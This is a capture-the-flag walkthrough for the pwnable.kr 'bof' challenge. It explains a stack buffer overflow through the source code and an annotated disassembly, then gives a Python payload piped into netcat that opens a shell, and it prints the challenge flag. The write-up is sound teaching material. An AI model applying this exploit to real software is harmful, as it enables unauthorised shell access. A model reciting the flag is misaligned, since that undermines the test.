# bof — pwnable.kr

## Goal

get shell to get the flag

---

## Files Provided

* `bof`
* `bof.c` — `bof`s source
* `readme` — the goal

---

## Walkthrough

```commandline
bof@ubuntu:~$ cat bof.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		setregid(getegid(), getegid());
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

Here we can see the bof code gets a key as a param.
It will run `/bin/sh` if we will use the right key `0xcafebabe`.
But the key passed is `0xdeadbeef`

We can overflow the `overflowme` char[] and get to key
(When running a function the stack keeps the args and then the local vars)

Also, when just trying to pass 32 chars + 0xcafebabe it detects that I try to overflow and kills me
BUT if I'll succeed it won't since it won't be the end of the function, and it's validation should pass.

I tried to use gdb to examine what is the real number of bytes i need to pass
here is `dissas func`:

```shell
pwndbg> disass func
Dump of assembler code for function func:
   0x000011fd <+0>:	push   ebp ; keep the caller stack pointer
   0x000011fe <+1>:	mov    ebp,esp ; update ebp to the current stack pointer
   0x00001200 <+3>:	push   esi ; push some registers
   0x00001201 <+4>:	push   ebx ; push some registers
   0x00001202 <+5>:	sub    esp,0x30 ; allocate them space
   0x00001205 <+8>:	call   0x1100 <__x86.get_pc_thunk.bx>
   0x0000120a <+13>:	add    ebx,0x2df6
   0x00001210 <+19>:	mov    eax,gs:0x14 ; move a random value stored somewhere else into the stack - later this will recognize if we did bof
   0x00001216 <+25>:	mov    DWORD PTR [ebp-0xc],eax ; store it after the 32 buffer
   0x00001219 <+28>:	xor    eax,eax
   0x0000121b <+30>:	sub    esp,0xc ; since theres a padding of 44 in the buffer allocation- reset the stack pointer back by 12 so the buffer will be effectivly 32
   0x0000121e <+33>:	lea    eax,[ebx-0x1ff8] ; load the string to print
   0x00001224 <+39>:	push   eax
   0x00001225 <+40>:	call   0x1050 <printf@plt> ; print the string "overflow me : "
   0x0000122a <+45>:	add    esp,0x10 - cleanup after printf
   0x0000122d <+48>:	sub    esp,0xc - go 12 back in the stack pointer
   0x00001230 <+51>:	lea    eax,[ebp-0x2c] ; allocate 0x2c - 44 for an internal value that will be saved at eax
   0x00001233 <+54>:	push   eax
   0x00001234 <+55>:	call   0x1060 <gets@plt> ; call gets -> result is at eax
   0x00001239 <+60>:	add    esp,0x10 go 12 forward since we only need the first 32
   0x0000123c <+63>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe ; compare the first argument with the wanted key
   0x00001243 <+70>:	jne    0x1272 <func+117> ; if not equals, jump to else block
   0x00001245 <+72>:	call   0x1080 <getegid@plt> ; 
   0x0000124a <+77>:	mov    esi,eax
   0x0000124c <+79>:	call   0x1080 <getegid@plt>
   0x00001251 <+84>:	sub    esp,0x8
   0x00001254 <+87>:	push   esi
   0x00001255 <+88>:	push   eax
   0x00001256 <+89>:	call   0x10b0 <setregid@plt>
   0x0000125b <+94>:	add    esp,0x10
   0x0000125e <+97>:	sub    esp,0xc
   0x00001261 <+100>:	lea    eax,[ebx-0x1fe9]
   0x00001267 <+106>:	push   eax
   0x00001268 <+107>:	call   0x10a0 <system@plt>
   0x0000126d <+112>:	add    esp,0x10
   0x00001270 <+115>:	jmp    0x1284 <func+135> ; don't go to the else block
   0x00001272 <+117>:	sub    esp,0xc ; else
   0x00001275 <+120>:	lea    eax,[ebx-0x1fe1]
   0x0000127b <+126>:	push   eax
   0x0000127c <+127>:	call   0x1090 <puts@plt>
   0x00001281 <+132>:	add    esp,0x10
   0x00001284 <+135>:	nop ; end of else block 
   0x00001285 <+136>:	mov    eax,DWORD PTR [ebp-0xc] ; get the random number weve stored to verify it was not overflowed
   0x00001288 <+139>:	sub    eax,DWORD PTR gs:0x14 ; kinda compare - if the sub returns 0 
   0x0000128f <+146>:	je     0x1296 <func+153> ; if the sub returns 0 i wasnt overflowed
   0x00001291 <+148>:	call   0x12e0 <__stack_chk_fail_local> ; booz
   0x00001296 <+153>:	lea    esp,[ebp-0x8] ; exit gracefully
   0x00001299 <+156>:	pop    ebx
   0x0000129a <+157>:	pop    esi
   0x0000129b <+158>:	pop    ebp
   0x0000129c <+159>:	ret    
End of assembler dump.
```

We see that if I pass a 32 + value, it doesn't overflow the argument.
since there is a 12 offset it allocates 44.
So I don't overflow the argument I want, but I do overflow their check, so I fail.

If I cared about exiting gracefully I would have needed to fund the gs:0x14 value and use it in the overflow.
But I don't, I get the shell before the check and that's my goal.
So all I need to do is overflow by 44 + 0x8 (the first arg offset) and not 32

Using python I've constructed the bytes to send to the nc 127.0.0.1 9000
```python
import sys; sys.stdout.buffer.write(b'a' * (32+12+8) + b'\xbe\xba\xfe\xca')
```
notice the fact that I use little endian

Now let's pipe it to the bof runnable and also pipe our STDIN using the `cat` command to use the shell that it started
```shell
(python -c "import sys; sys.stdout.buffer.write(b'a' * 52 + b'\xbe\xba\xfe\xca')" && cat) | nc 127.0.0.1 9000
```
The result is:
```shell
bof@ubuntu:~$ (python -c "import sys; sys.stdout.buffer.write(b'a' * 52 + b'\xbe\xba\xfe\xca')" && cat) | nc 127.0.0.1 9000

cat flag
Daddy_I_just_pwned_a_buff3r!
```

